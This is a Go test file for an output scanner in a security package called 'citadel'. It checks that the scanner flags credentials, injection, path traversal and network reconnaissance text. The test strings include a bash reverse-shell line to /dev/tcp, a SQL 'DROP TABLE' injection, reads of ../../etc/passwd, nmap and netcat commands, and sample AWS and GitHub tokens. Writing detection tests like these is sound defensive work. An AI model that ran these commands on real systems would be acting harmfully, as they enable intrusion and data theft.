package ml

import (
	"strings"
	"testing"

	"github.com/TryMightyAI/citadel/pkg/patterns"
)

func TestOutputScanner_Credentials(t *testing.T) {
	scanner := NewOutputScanner()

	testCases := []struct {
		name        string
		text        string
		wantSafe    bool
		wantMinRisk int
	}{
		{
			name:        "AWS Access Key",
			text:        "Found config with AKIAIOSFODNN7EXAMPLE",
			wantSafe:    false,
			wantMinRisk: 80,
		},
		{
			name:        "GitHub PAT",
			text:        "Token: ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
			wantSafe:    false,
			wantMinRisk: 80,
		},
		{
			name:        "Generic API Key",
			text:        "api_key=sk_live_XXXXXXXXXXXXXXXXXXXXXXXXXXXX",
			wantSafe:    false,
			wantMinRisk: 50,
		},
		{
			name:        "Safe API documentation",
			text:        "The API is available at api.example.com",
			wantSafe:    true,
			wantMinRisk: 0,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scanner.ScanOutput(tc.text)

			if result.IsSafe != tc.wantSafe {
				if tc.wantSafe {
					t.Errorf("expected safe, got findings: %v", result.Findings)
				} else {
					t.Errorf("expected threat detection, got safe")
				}
			}

			if !tc.wantSafe && result.RiskScore < tc.wantMinRisk {
				t.Errorf("expected risk >= %d, got %d", tc.wantMinRisk, result.RiskScore)
			}
		})
	}
}

func TestOutputScanner_InjectionAttacks(t *testing.T) {
	scanner := NewOutputScanner()

	testCases := []struct {
		name     string
		text     string
		wantSafe bool
	}{
		{
			name:     "SQL Injection in output",
			text:     "Result: '; DROP TABLE users--",
			wantSafe: false,
		},
		{
			name:     "Reverse shell command",
			text:     "Execute: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			wantSafe: false,
		},
		{
			name:     "Normal SQL query",
			text:     "SELECT * FROM users WHERE id = ?",
			wantSafe: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scanner.ScanOutput(tc.text)

			if result.IsSafe != tc.wantSafe {
				if tc.wantSafe {
					t.Errorf("expected safe, got findings: %v", result.Findings)
				} else {
					t.Errorf("expected threat detection, got safe")
				}
			}
		})
	}
}

func TestOutputScanner_PathTraversal(t *testing.T) {
	scanner := NewOutputScanner()

	testCases := []struct {
		name     string
		text     string
		wantSafe bool
	}{
		{
			name:     "Unix path traversal",
			text:     "Reading file: ../../etc/passwd",
			wantSafe: false,
		},
		{
			name:     "Windows system path",
			text:     "Access C:\\Windows\\System32\\config",
			wantSafe: false,
		},
		{
			name:     "Normal relative path",
			text:     "Reading from ./data/users.json",
			wantSafe: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scanner.ScanOutput(tc.text)

			if result.IsSafe != tc.wantSafe {
				if tc.wantSafe {
					t.Errorf("expected safe, got findings: %v", result.Findings)
				} else {
					t.Errorf("expected threat detection, got safe")
				}
			}
		})
	}
}

func TestOutputScanner_NetworkRecon(t *testing.T) {
	scanner := NewOutputScanner()

	testCases := []struct {
		name     string
		text     string
		wantSafe bool
	}{
		{
			name:     "Nmap scan",
			text:     "Run nmap -sV 192.168.1.0/24",
			wantSafe: false,
		},
		{
			name:     "Netcat connection",
			text:     "Connect with nc 10.0.0.1 4444",
			wantSafe: false,
		},
		{
			name:     "Normal network text",
			text:     "Ping the server to check connectivity",
			wantSafe: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scanner.ScanOutput(tc.text)

			if result.IsSafe != tc.wantSafe {
				if tc.wantSafe {
					t.Errorf("expected safe, got findings: %v", result.Findings)
				} else {
					t.Errorf("expected threat detection, got safe")
				}
			}
		})
	}
}

func TestOutputScanner_MultipleThreats(t *testing.T) {
	scanner := NewOutputScanner()

	// Text with multiple threat types
	text := `
		Here's some data I found:
		AWS Key: AKIAIOSFODNN7EXAMPLE
		Running nmap -sV 192.168.1.0/24
		Reading ../../etc/passwd
		Use pickle.loads(data) to deserialize
	`

	result := scanner.ScanOutput(text)

	if result.IsSafe {
		t.Error("expected threats, got safe")
	}

	// Should find multiple categories
	if len(result.ThreatCategories) < 3 {
		t.Errorf("expected at least 3 threat categories, got %d: %v",
			len(result.ThreatCategories), result.ThreatCategories)
	}

	// Risk score should be substantial
	if result.RiskScore < 200 {
		t.Errorf("expected combined risk >= 200, got %d", result.RiskScore)
	}

	t.Logf("Found %d issues, risk score: %d, level: %s",
		len(result.Findings), result.RiskScore, result.RiskLevel)
}

func TestOutputScanner_QuickScan(t *testing.T) {
	scanner := NewOutputScanner()

	// Test quick scan (early exit)
	safe, reason := scanner.ScanOutputQuick("This is safe text")
	if !safe {
		t.Errorf("expected safe, got reason: %s", reason)
	}

	safe, reason = scanner.ScanOutputQuick("Found key AKIAIOSFODNN7EXAMPLE")
	if safe {
		t.Error("expected threat detection, got safe")
	}
	if reason == "" {
		t.Error("expected reason for threat")
	}

	t.Logf("Quick scan detected: %s", reason)
}

func TestOutputScanner_CustomCategories(t *testing.T) {
	// Scanner that only looks for credentials
	scanner := NewOutputScannerWithCategories(patterns.CategoryCredential)

	// Should detect credentials
	result := scanner.ScanOutput("Token: ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789")
	if result.IsSafe {
		t.Error("expected credential detection")
	}

	// Should NOT detect network recon (not in categories)
	result = scanner.ScanOutput("Run nmap -sV 192.168.1.0/24")
	if !result.IsSafe {
		t.Error("expected safe (network recon not in categories)")
	}
}

func TestOutputScanner_RedactCredentials(t *testing.T) {
	scanner := NewOutputScanner()
	scanner.RedactCredentials = true

	result := scanner.ScanOutput("Token: AKIAIOSFODNN7EXAMPLE")

	// Check that the match is redacted
	for _, detail := range result.Details {
		if detail.Category == string(patterns.CategoryCredential) {
			if detail.Match == "AKIAIOSFODNN7EXAMPLE" {
				t.Error("credential should be redacted")
			}
			if !strings.Contains(detail.Match, "[REDACTED]") {
				t.Errorf("expected [REDACTED] in match, got: %s", detail.Match)
			}
		}
	}
}

func TestConvenienceFunctions(t *testing.T) {
	// Test package-level convenience functions
	result := ScanOutput("Normal safe text here")
	if !result.IsSafe {
		t.Error("expected safe")
	}

	safe, _ := ScanOutputQuick("Found AKIAIOSFODNN7EXAMPLE")
	if safe {
		t.Error("expected threat detection")
	}
}

// Benchmark for performance verification
func BenchmarkOutputScanner_SingleText(b *testing.B) {
	scanner := NewOutputScanner()
	text := "Found key AKIAIOSFODNN7EXAMPLE in config file"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = scanner.ScanOutput(text)
	}
}

func BenchmarkOutputScanner_MultiThreat(b *testing.B) {
	scanner := NewOutputScanner()
	text := `
		AWS Key: AKIAIOSFODNN7EXAMPLE
		Running nmap -sV 192.168.1.0/24
		Reading ../../etc/passwd
		Use pickle.loads(data) to deserialize
	`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = scanner.ScanOutput(text)
	}
}

func BenchmarkOutputScanner_QuickScan(b *testing.B) {
	scanner := NewOutputScanner()
	text := "Found key AKIAIOSFODNN7EXAMPLE in config file"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = scanner.ScanOutputQuick(text)
	}
}
